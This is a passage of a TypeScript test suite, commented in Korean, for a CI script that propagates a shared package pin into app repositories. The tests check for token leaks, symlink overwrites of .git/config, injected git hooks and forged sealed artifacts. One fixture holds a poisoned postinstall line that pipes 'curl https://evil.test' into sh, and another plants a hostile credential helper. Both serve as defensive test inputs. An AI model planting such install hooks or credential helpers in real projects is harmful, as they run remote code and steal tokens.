    expect(listFiles(openArtifact(tmp))).toEqual(["meta.json"]);
    expect(r.push?.code, r.push?.stderr).toBe(0);
    expect(r.push?.out).toContain("result=skipped-same");
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("현재 핀이 더 새 것이거나 다른 갈래면 skipped-not-descendant — 핀이 뒤로 가지 않는다", () => {
    // ① 더 새 것: 앱은 c3, 늦게 도착한 반영이 c2 를 들고 온 경우
    const newer = fakeApp(tmp, "newer", pkg.c3);
    const r1 = runAll(tmp, {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c2,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: newer.bare,
    });
    expect(r1.prepare?.code, r1.prepare?.stderr).toBe(0);
    expect(r1.prepare?.out).toContain("result=skipped-not-descendant");
    expect(r1.push?.out).toContain("result=skipped-not-descendant");
    expect(sh("git show main:package.json", newer.bare)).toContain(SPEC(pkg.c3));

    // ② 다른 갈래: 앱이 곁가지 x1 에 물려 있으면 main 의 c3 는 그 후손이 아니다
    const side = fakeApp(tmp, "side", pkg.x1);
    const r2 = runAll(tmp, {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: side.bare,
    });
    expect(r2.prepare?.code, r2.prepare?.stderr).toBe(0);
    expect(r2.prepare?.out).toContain("result=skipped-not-descendant");
    expect(sh("git show main:package.json", side.bare)).toContain(SPEC(pkg.x1));
  }, 60_000);

  it("dry run: 커밋은 만들되 푸시하지 않는다", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    const r = runAll(tmp, {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
      PROPAGATE_DRY_RUN: "1",
    });
    expect(r.push?.code, r.push?.stderr).toBe(0);
    expect(r.push?.out).toContain("result=dry-run");
    expect(r.push?.stdout).toMatch(/package-lock\.json/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("경합(다른 파일): 준비와 밀기 사이에 사람이 밀면 rebase 로 얹고 사람 커밋도 남는다", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const env = {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    };
    const { prepare } = runPrepare(tmp, env);
    expect(prepare?.code, prepare?.stderr).toBe(0);

    // 준비가 끝난 뒤 사람이 **다른 파일**을 고쳐 민다
    humanPush(tmp, app.bare, (dir) => writeFileSync(join(dir, "README.md"), "app\n사람이 고침\n"), "사람 커밋");

    const push = runStep(tmp, "push", env);
    expect(push.code, push.stderr).toBe(0);
    // 진짜로 「거부 → 다시 얹기」를 지나왔다는 증거(그냥 앞으로 감기로 들어갔으면 이 줄이 없다)
    expect(push.stderr).toMatch(/푸시 거부 \(1\/3\)/);
    expect(push.out).toContain("result=updated");
    const log = sh("git log --format=%s main", app.bare);
    expect(log.split("\n")[0]).toMatch(/^chore\(정책매칭 공용\)/);
    expect(log).toContain("사람 커밋");
    // 사람이 넣은 줄이 살아 있어야 한다(rebase 로 덮어쓰지 않았다는 증거)
    expect(sh("git show main:README.md", app.bare)).toContain("사람이 고침");
    expect(sh("git show main:package.json", app.bare)).toContain(SPEC(pkg.c3));
  }, 60_000);

  it("경합(같은 파일): 사람이 핀을 손으로 바꿨으면 rebase 충돌로 1 — 사람 커밋을 덮지 않는다", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const env = {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    };
    const { prepare } = runPrepare(tmp, env);
    expect(prepare?.code, prepare?.stderr).toBe(0);

    // 사람이 **같은 파일의 같은 줄**(핀)을 손으로 c2 로 바꿔 민다
    humanPush(
      tmp,
      app.bare,
      (dir) => {
        const p = join(dir, "package.json");
        writeFileSync(p, readFileSync(p, "utf8").replace(SPEC(pkg.c1), SPEC(pkg.c2)));
      },
      "사람이 핀을 손으로 바꿈",
    );
    const humanHead = sh("git rev-parse main", app.bare);

    const push = runStep(tmp, "push", env);
    expect(push.code).toBe(1);
    expect(push.stderr).toMatch(/rebase 충돌/);
    expect(sh("git rev-parse main", app.bare)).toBe(humanHead); // 사람 커밋이 그대로 끝이다
    expect(sh("git show main:package.json", app.bare)).toContain(SPEC(pkg.c2));
  }, 60_000);

  it("준비가 본 기준 커밋이 앱 저장소에 없으면(되감기·강제 푸시) 밀지 않고 1 로 멈춘다", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const env = {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    };
    const { prepare } = runPrepare(tmp, env);
    expect(prepare?.code, prepare?.stderr).toBe(0);

    // 앱 저장소에 없는 커밋을 기준으로 삼게 만든다 — main 이 되감기거나 강제 푸시로 갈린 상황과 같다.
    // (산출물은 봉인돼 있으니 풀어서 고치고 **다시 봉인**한다 — 공개키만 있으면 누구나 할 수 있는 일이고,
    //  그래서 밀기 단계는 봉인을 푼 뒤에도 내용을 스스로 다시 본다.)
    const opened = openArtifact(tmp);
    const meta = JSON.parse(readFileSync(join(opened, "meta.json"), "utf8")) as Record<string, string>;
    meta.baseSha = "0123456789abcdef0123456789abcdef01234567";
    writeFileSync(join(opened, "meta.json"), JSON.stringify(meta, null, 2) + "\n");
    sealInto(join(tmp, "artifact"), opened, KEYS.pubPem);
    const before = sh("git rev-parse main", app.bare);

    const push = runStep(tmp, "push", env);
    expect(push.code).toBe(1);
    expect(push.stderr).toMatch(/찾지 못했습니다/);
    expect(sh("git rev-parse main", app.bare)).toBe(before); // 엉뚱한 자리에 얹지 않는다
  }, 60_000);

  it("클론에 자격이 남아 있으면 그 자리에서 멈춘다 — 토큰 값은 오류문에도 안 적는다", () => {
    // clone 단계가 앱 코드에게 폴더를 넘기기 전에 부르는 검사(lib.sh assert_no_credentials).
    // 실제 토큰 클론을 시험에서 돌릴 수는 없으니 함수를 직접 불러 잰다.
    const secret = "ghp_NEVER_IN_A_MESSAGE_0001";
    const poisoned = join(tmp, "poisoned");
    mkdirSync(join(poisoned, ".git"), { recursive: true });
    writeFileSync(
      join(poisoned, ".git/config"),
      `[remote "origin"]\n\turl = https://x-access-token:${secret}@github.com/smlee-hash/wedly-policy-lab.git\n`,
    );
    const call = (dir: string) =>
      spawnSync("bash", ["-c", `set -euo pipefail; APP_ID=lab; . "${LIB}"; assert_no_credentials "${dir}"`], {
        encoding: "utf8",
        env: { ...process.env, ...HERMETIC_GIT },
      });

    const bad = call(poisoned);
    expect(bad.status).toBe(1);
    expect(bad.stderr).toMatch(/자격/);
    expect(bad.stderr).not.toContain(secret);
    expect(bad.stdout).not.toContain(secret);

    // 깨끗한 클론은 그냥 지나간다(검사가 늘 빨간 것이 아니라는 확인)
    const clean = join(tmp, "clean");
    mkdirSync(join(clean, ".git"), { recursive: true });
    writeFileSync(join(clean, ".git/config"), `[remote "origin"]\n\turl = https://github.com/smlee-hash/wedly-policy-lab.git\n`);
    expect(call(clean).status).toBe(0);
  }, 60_000);

  it("commitPaths 밖 파일이 바뀌면 실패하고 목록을 알린다", () => {
    const app = fakeApp(tmp, "erp", pkg.c1, (w) => {
      seedErpDesignSystem(w, `import { writeFileSync } from "node:fs";\nwriteFileSync("stray.txt", "b\\n");\n`);
      writeFileSync(join(w, "stray.txt"), "a\n");
    });
    const before = sh("git rev-parse main", app.bare);
    const r = runPrepare(tmp, {
      PROPAGATE_APP_ID: "erp",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.prepare?.code).toBe(1);
    expect(r.prepare?.stderr).toMatch(/stray\.txt/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("입력 오류(단계 이름·SHA 형식·모르는 앱)는 2 — 그리고 왜인지 말한다", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const base = {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    };

    const noStep = spawnSync("bash", [SCRIPT], { encoding: "utf8", env: { ...process.env, ...HERMETIC_GIT } });
    expect(noStep.status).toBe(2);
    expect(noStep.stderr).toMatch(/clone\|prepare\|push/);

    const badStep = spawnSync("bash", [SCRIPT, "밀어"], { encoding: "utf8", env: { ...process.env, ...HERMETIC_GIT } });
    expect(badStep.status).toBe(2);

    const cloned = runStep(tmp, "clone", base);
    expect(cloned.code, cloned.stderr).toBe(0);
    const badSha = runStep(tmp, "prepare", { ...base, PROPAGATE_SHA: "abc" });
    expect(badSha.code).toBe(2);
    expect(badSha.stderr).toMatch(/PROPAGATE_SHA/);

    const unknown = runStep(tmp, "clone", { ...base, PROPAGATE_APP_ID: "hive" });
    expect(unknown.code).toBe(2);
    expect(unknown.stderr).toMatch(/hive/);
  }, 60_000);

  it("산출물이 없으면 밀기 단계는 2 로 멈춘다 — artifact 를 못 받은 것을 조용히 넘기지 않는다", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_CLONE_URL: app.bare,
      PROPAGATE_OUT: join(tmp, "없는-폴더"),
    });
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/bundle\.enc/);
    expect(sh("git log --format=%s main", app.bare)).toBe("seed");
  }, 60_000);

  it("주소에 토큰이 섞여 있어도 어떤 출력에도 남기지 않는다", () => {
    const secret = "ghp_SHOULD_NEVER_APPEAR_1234567890";
    const noProxy = {
      http_proxy: "",
      https_proxy: "",
      HTTP_PROXY: "",
      HTTPS_PROXY: "",
      ALL_PROXY: "",
      NO_PROXY: "*",
    };
    const base = { PROPAGATE_APP_ID: "lab", PROPAGATE_SHA: pkg.c3, PROPAGATE_PACKAGE_DIR: pkg.dir };

    // ① https 주소: 127.0.0.1:1 은 곧바로 연결 거부된다(네트워크를 쓰지 않는다).
    //   요즘 git 은 이 오류문에서 자격을 스스로 지우지만, 우리가 주소를 직접 찍으면 그대로 샌다.
    const viaHttps = runStep(tmp, "clone", {
      ...base,
      PROPAGATE_CLONE_URL: `https://x-access-token:${secret}@127.0.0.1:1/smlee-hash/wedly-policy-lab.git`,
      ...noProxy,
    });
    expect(viaHttps.code).toBe(1);
    expect(viaHttps.stdout).not.toContain(secret);
    expect(viaHttps.stderr).not.toContain(secret);
    expect(viaHttps.out).not.toContain(secret);
    expect(viaHttps.stderr).toMatch(/propagate/); // 실패했다는 사실 자체는 알려야 한다

    // ② 로컬 경로 주소: git 은 이 문자열을 **그대로** 오류에 찍는다(2026-09-08 실측).
    //   로컬 경로는 예행연습이 실제로 쓰는 방식이라 가리개가 없으면 여기서 샌다.
    const viaPath = runStep(tmp, "clone", {
      ...base,
      PROPAGATE_CLONE_URL: `${tmp}/none//x-access-token:${secret}@github.com/x.git`,
      ...noProxy,
    });
    expect(viaPath.code).toBe(1);
    expect(viaPath.stdout).not.toContain(secret);
    expect(viaPath.stderr).not.toContain(secret);
    expect(viaPath.out).not.toContain(secret);
    expect(viaPath.stderr).toMatch(/x-access-token|\*\*\*/); // 무엇을 물고 실패했는지는 남아야 한다
  }, 60_000);

  it("npm 이 죽어도 종료 코드는 1 — npm 의 코드(128)를 그대로 내보내지 않는다", () => {
    // 2026-09-08 랩 저장소 예행에서 실제로 겪은 일: `npm install --package-lock-only` 가 128 로 죽자
    // 스크립트도 128 로 끝났다. 규격(0=반영·건너뜀 / 1=실패 / 2=입력 오류)을 지켜야
    // 워크플로우·알림이 「입력 오류」와 「일 실패」를 구분할 수 있다.
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    const r = runPrepare(tmp, {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
      FAKE_NPM_FAIL: "install",
    });
    expect(r.prepare?.code).toBe(1);
    expect(r.prepare?.stderr).toMatch(/잠금 파일 갱신/);
    expect(sh("git rev-parse main", app.bare)).toBe(before); // 실패하면 아무것도 밀지 않는다
  }, 60_000);

  // ── 2026-09-08 2차 리뷰 F1: 준비의 실패는 **산출물로** 전해지고, 알림은 밀기 job 에서만 간다 ──

  it("준비가 죽으면 산출물에 사유가 담긴 meta.json(failed)이 남는다 — 준비 job 은 알림을 보내지 않는다", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const r = runPrepare(tmp, {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
      FAKE_NPM_FAIL: "install",
    });
    expect(r.prepare?.code).toBe(1);
    // 실패 사유도 **봉인해서** 올린다(F9) — 평문 meta.json 이 공개 산출물로 나가지 않는다
    expect(listFiles(join(tmp, "artifact"))).toEqual(["bundle.enc", "key.enc"]);
    const meta = JSON.parse(readFileSync(join(openArtifact(tmp), "meta.json"), "utf8")) as Record<string, string>;
    expect(meta.app).toBe("lab");
    expect(meta.result).toBe("failed");
    expect(meta.error).toMatch(/잠금 파일 갱신/);
    expect(meta.error).not.toContain("\n"); // 알림 한 줄에 그대로 들어가야 한다
  }, 60_000);

  it("클론이 죽어도 사유가 담긴 meta.json 이 남는다 — 밀기 job 이 그 사유로 알린다", () => {
    const r = runStep(tmp, "clone", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: join(tmp, "없는-저장소.git"),
    });
    expect(r.code).toBe(1);
    const meta = JSON.parse(readFileSync(join(openArtifact(tmp), "meta.json"), "utf8")) as Record<string, string>;
    expect(meta.result).toBe("failed");
    expect(meta.error).toMatch(/클론 실패/);
  }, 60_000);

  it("산출물이 failed 면 밀기는 1 로 끝나고 사유를 그대로 알린다 — 원격은 그대로", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    writeArtifact(tmp, { app: "lab", result: "failed", error: "후처리 실패: npm run design:check" }, {});
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("후처리 실패: npm run design:check");
    expect(r.out).toContain("result=failed");
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  // ── 2차 리뷰 F2: 산출물을 얹을 자리가 심볼릭 링크면 밀지 않는다 ──

  it("기준 커밋의 커밋 대상이 심볼릭 링크면 밀지 않는다 — `.git/config` 가 덮이지 않는다", () => {
    // 앱 저장소의 기준 커밋이 `registry.generated.json` 을 `../../../.git/config` 로 걸어 두면,
    // 밀기 단계가 그 자리에 파일을 쓰는 순간 **클론의 git 설정이 덮인다**(자격 도우미·url.insteadOf
    // 를 심어 다음 git 호출에서 토큰을 빼돌리는 길). 그래서 덮어쓰기 전에 막아야 한다.
    const app = fakeApp(tmp, "erp", pkg.c1, (w) => {
      mkdirSync(join(w, "src/lib/design-system"), { recursive: true });
      symlinkSync("../../../.git/config", join(w, "src/lib/design-system/registry.generated.json"));
    });
    const before = sh("git rev-parse main", app.bare);
    const baseSha = before;
    const MARKER = "[credential]\n\thelper = !사악한도우미\n";
    writeArtifact(
      tmp,
      { app: "erp", result: "prepared", baseSha, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
      {
        "package.json": pkgJsonAt("erp", pkg.c3),
        "package-lock.json": lockJsonAt(pkg.c3),
        "src/lib/design-system/registry.generated.json": MARKER,
      },
    );
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "erp",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/심볼릭 링크/);
    expect(sh("git rev-parse main", app.bare)).toBe(before); // 원격 불변

    // 그리고 클론의 `.git/config` 는 산출물 내용으로 덮이지 않았다 — 여전히 git 설정 파일이다.
    const cloneConfig = readFileSync(join(tmp, "work/push-erp/.git/config"), "utf8");
    expect(cloneConfig).not.toContain("사악한도우미");
    expect(cloneConfig).toContain('[remote "origin"]');
    expect(sh("git config --get remote.origin.url", join(tmp, "work/push-erp"))).toBe(app.bare);
  }, 60_000);

  it("밀기 단계는 실행기가 심어 둔 git 설정을 눌러 버린다 — 남의 갈고리가 토큰 옆에서 돌지 않는다", () => {
    // 2차 리뷰 F2: 밀기 job 은 토큰을 쥔 자리다. 실행기 환경이 `core.hooksPath` 같은 설정을 들고
    // 있으면 그 갈고리가 우리 git 호출과 함께 돈다. 그래서 스크립트가 `GIT_CONFIG_COUNT` 로
    // 자격 도우미·갈고리·대리 서버·ssh 명령을 전부 눌러 둔다.
    // 재는 법: **일부러 죽는 갈고리**를 환경으로 물려준다. 눌러 두지 않으면 커밋이 실패한다.
    const hooks = join(tmp, "적대적-갈고리");
    mkdirSync(hooks, { recursive: true });
    writeFileSync(join(hooks, "pre-commit"), "#!/usr/bin/env bash\necho '갈고리가 돌았습니다' >&2\nexit 1\n");
    chmodSync(join(hooks, "pre-commit"), 0o755);

    const app = fakeApp(tmp, "lab", pkg.c1);
    const r = runAll(tmp, {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
      GIT_CONFIG_COUNT: "1",
      GIT_CONFIG_KEY_0: "core.hooksPath",
      GIT_CONFIG_VALUE_0: hooks,
    });
    expect(r.push?.code, r.push?.stderr).toBe(0);
    expect(r.push?.stderr).not.toContain("갈고리가 돌았습니다");
    expect(r.push?.out).toContain("result=updated");
  }, 60_000);

  // ── 2차 리뷰 F3: 밀기는 `resolve` 가 정한 SHA 만 믿는다 ──

  it("산출물이 다른 SHA 를 가리키면 밀지 않는다 — meta 와 파일을 함께 바꿔도 소용없다", () => {
    // 앱 코드가 산출물을 통째로 지어 「다른 커밋으로 핀을 올리라」고 시키는 상황.
    // meta.pinTo 와 package.json·package-lock 을 **함께** 그 SHA 로 맞춰도 통과하면 안 된다 —
    // 이 자리가 믿는 것은 resolve 가 정한 PROPAGATE_SHA 하나뿐이다.
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    writeArtifact(
      tmp,
      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.x1, subject: "feat: 시험 커밋" },
      { "package.json": pkgJsonAt("lab", pkg.x1), "package-lock.json": lockJsonAt(pkg.x1) },
    );
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3, // resolve 가 정한 것은 c3
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/다른 커밋을 가리킵니다/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("산출물의 pinFrom 이 저장소의 실제 핀과 다르면 밀지 않는다", () => {
    // 산출물이 「원래 핀은 c2 였다」고 거짓말하는 상황(실제 저장소 핀은 c1).
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    writeArtifact(
      tmp,
      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c2, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
      { "package.json": pkgJsonAt("lab", pkg.c3), "package-lock.json": lockJsonAt(pkg.c3) },
    );
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/기준 커밋의 핀이 산출물과 다릅니다/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("지금 핀이 이번 커밋의 조상이 아니면 밀기 단계도 스스로 막는다 — 핀이 뒤로 가지 않는다", () => {
    // 앱 핀이 곁가지 x1 인데 반영 대상이 c3 인 경우. 준비 단계가 이미 막지만, 밀기도 다시 본다
    // (산출물이 준비 단계를 거치지 않고 들어올 수 있으므로).
    const app = fakeApp(tmp, "lab", pkg.x1);
    const before = sh("git rev-parse main", app.bare);
    writeArtifact(
      tmp,
      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.x1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
      { "package.json": pkgJsonAt("lab", pkg.c3), "package-lock.json": lockJsonAt(pkg.c3) },
    );
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/조상이 아닙니다/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("허용된 파일 안에 postinstall 을 섞어 오면 밀지 않는다 — 원격 불변(2차 리뷰 F4)", () => {
    // 핀은 제대로 새 SHA 인 산출물이라 verify-lock 은 통과한다. 그런데 `package.json` 에
    // `postinstall` 이 하나 늘었다 — Railway 가 설치할 때 그 명령이 돈다. verify-artifact 가 막는다.
    const appPkg = (sha: string, extraScripts: Record<string, string> = {}) =>
      JSON.stringify(
        {
          name: "lab",
          scripts: { build: "next build", ...extraScripts },
          dependencies: { "@wedly/policy-match-shared": SPEC(sha) },
        },
        null,
        2,
      ) + "\n";
    const app = fakeApp(tmp, "lab", pkg.c1, (w) => writeFileSync(join(w, "package.json"), appPkg(pkg.c1)));
    const before = sh("git rev-parse main", app.bare);
    const poisoned = appPkg(pkg.c3, { postinstall: "curl https://evil.test | sh" });
    writeArtifact(
      tmp,
      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
      { "package.json": poisoned, "package-lock.json": lockJsonAt(pkg.c3) },
    );
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/postinstall/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("산출물 package.json 이 개체가 아닌 JSON(0)이면 밀지 않는다 — 검사를 건너뛰지 않는다(3차 리뷰 G2)", () => {
    // 대조기 단위 시험(verify-lock·verify-artifact)이 이미 재는 판정이지만, **밀기 단계가 실제로**
    // 그 판정을 거쳐 원격을 건드리지 않는지는 여기서만 잰다. `0` 은 JSON 으로는 멀쩡히 읽힌다 —
    // 옛 판의 `if (pkg)` 는 그것을 「읽기 실패」로 오해해 대조를 통째로 건너뛰었다.
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    writeArtifact(
      tmp,
      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
      { "package.json": "0\n", "package-lock.json": lockJsonAt(pkg.c3) },
    );
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/최상위가 개체가 아님/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("커밋할 파일이 없으면(등록부 미생성) 1 로 끝나고 무엇이 없는지 알린다", () => {
    // ERP 후처리가 설계 등록부를 못 만든 경우. verify-lock 은 등록부를 보지 않으므로 여기까지 통과한다.
    const app = fakeApp(tmp, "erp", pkg.c1, (w) => {
      // `design:check` script 는 있고(그래서 후처리는 통과) 등록부 파일만 없는 상황을 만든다.
      seedErpScripts(w);
      writeFileSync(join(w, "scripts/design-system/cli.mjs"), "// 아무것도 만들지 않는다\n");
    });
    const before = sh("git rev-parse main", app.bare);
    const r = runPrepare(tmp, {
      PROPAGATE_APP_ID: "erp",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.prepare?.code).toBe(1);
    expect(r.prepare?.stderr).toMatch(/registry\.generated\.json/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  // ── 2026-09-08 총괄 결정 F9: 산출물은 봉인해서 올린다(공개 저장소의 artifact 는 누구나 받는다) ──

  it("올리는 산출물에는 평문이 하나도 없다 — bundle.enc·key.enc 두 장뿐", () => {
    // ★막는 사고: 이 저장소는 공개라 Actions 산출물을 **누구나 내려받는다.** 그런데 그 안에는
    //  비공개 앱의 package.json·잠금 파일·설계 등록부가 들어 있다(= 쓰는 꾸러미·사내 주소가 공개된다).
    // ★재는 방식: 올린 폴더의 **바이트를 뒤져** 평문 흔적이 하나도 없는지 본다.
    const app = fakeApp(tmp, "erp", pkg.c1, (w) => seedErpDesignSystem(w));
    const r = runPrepare(tmp, {
      PROPAGATE_APP_ID: "erp",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.prepare?.code, r.prepare?.stderr).toBe(0);
    const outDir = join(tmp, "artifact");
    expect(listFiles(outDir)).toEqual(["bundle.enc", "key.enc"]);
    for (const name of listFiles(outDir)) {
      const bytes = readFileSync(join(outDir, name)).toString("latin1");
      expect(bytes, `${name} 에 평문이 보입니다`).not.toContain("policy-match-shared");
      expect(bytes, `${name} 에 평문이 보입니다`).not.toContain("dependencies");
      expect(bytes, `${name} 에 평문이 보입니다`).not.toContain("registry.generated");
      expect(bytes, `${name} 에 평문 SHA 가 보입니다`).not.toContain(pkg.c3);
    }
    // 그래도 밀기 단계는 그것을 풀어 쓴다 — 봉인 안에는 원래 파일이 그대로 있다
    const opened = openArtifact(tmp);
    expect(readFileSync(join(opened, "package.json"), "utf8")).toContain(SPEC(pkg.c3));
  }, 60_000);

  it("봉인·해제를 거쳐도 평소 흐름은 그대로 — 준비 → 밀기가 원격에 새 핀을 남긴다", () => {
    // F9 가 흐름을 깨지 않았다는 확인(봉인이 늘 실패하면 위 시험만으로는 초록일 수 있다).
    const app = fakeApp(tmp, "lab", pkg.c1);
    const r = runAll(tmp, {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.push?.code, r.push?.stderr).toBe(0);
    expect(r.push?.out).toContain("result=updated");
    expect(r.push?.stdout).toContain("봉인을 풀었습니다");
    expect(sh("git show main:package.json", app.bare)).toContain(SPEC(pkg.c3));
  }, 60_000);

  it("짝이 아닌 비밀키로는 못 푼다 — 밀기 1, 원격 그대로", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    writeArtifact(
      tmp,
      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
      { "package.json": pkgJsonAt("lab", pkg.c3), "package-lock.json": lockJsonAt(pkg.c3) },
    );
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
      PROPAGATE_ARTIFACT_PRIVKEY: OTHER_KEYS.privPem,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/열쇠를 풀지 못했습니다/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("봉인 안에 심볼릭 링크가 들어 있으면 풀자마자 멈춘다 — 꾸러미도 믿을 수 없는 입력이다", () => {
    // 공개키는 누구나 아는 값이라 **아무나** 그럴듯한 봉인을 지어낼 수 있다(봉인은 엿보기만 막는다).
    // 그래서 푼 뒤의 파일도 믿지 않는다: `package.json` 이 남의 파일을 가리키는 링크면 그대로 멈춘다
    // (안 그러면 뒤의 `cp` 가 링크를 따라가 엉뚱한 파일을 앱 저장소로 옮긴다).
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    const plain = mkdtempSync(join(tmpdir(), "propagate-linky-"));
    writeFileSync(
      join(plain, "meta.json"),
      JSON.stringify(
        { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
        null,
        2,
      ) + "\n",
    );
